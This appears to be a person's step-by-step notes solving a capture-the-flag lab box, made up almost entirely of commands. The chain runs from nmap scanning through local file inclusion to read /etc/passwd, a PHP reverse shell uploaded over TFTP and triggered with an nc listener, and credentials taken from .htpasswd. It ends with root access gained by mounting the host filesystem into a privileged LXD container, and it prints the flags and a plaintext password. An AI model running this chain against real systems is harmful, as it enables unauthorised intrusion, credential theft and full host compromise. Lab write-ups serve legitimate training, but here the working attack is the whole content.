[[ping]] the host
sudo nmap -sC  -sV --min-rate=1000 \[target host IP]
http://[target host IP]/?file=etc/passwd
*for UDP ports*
sudo nmap -sU --min-rate=1000 \[target host IP]
sudo apt-get install tftp-hpa
tftp \[target host IP]
put shell.php
*or alternative to tftp, can use curl:*
curl -T shell.php tftp://[target host IP]/

*From the passwd file that we read earlier, the TFTP user's home folder is specified as /var/lib/tftpboot*
*tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin*

nc -lvp 1234
curl 'http://{target_IP}/?file=/var/lib/tftpboot/shell.php'

python3 -c 'import pty;pty.spawn("/bin/bash")'
cd /var/www/html
ls -la
cat .htaccess
cat .htpasswd *mike:Sheffield19*
cat/home/mike/user.txt *a56ef91d70cfbf2cdb8f454c006935a1*
id
groups

sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
git clone https://github.com/lxc/distrobuilder
cd distrobuilder
make
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18
python3 -m http.server 8000

*switch back to reverse shell and download the files*
cd ~
wget http://[attacker host IP]:8000/incus.tar.xz
wget http://[attacker host IP]:8000/rootfs.squashfs
ls -la *to check that it's all transferred correctly*
lxc image import incus.tar.xz rootfs.squashfs --alias alpine
lxc image list *To verify that the image has been successfully imported we can list the LXD images*

*set the security.privileged flag to true, so that the container has all of the privileges that the root file system has*
lxc init alpine privesc -c security.privileged=true

*mount the root file system on the container in the /mnt folder*
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

lxc start privesc
lxc exec privesc /bin/sh
id
cd /mnt/root/root
cat root.txt *c693d9c7499d9f572ee375d4c14c7bcf*
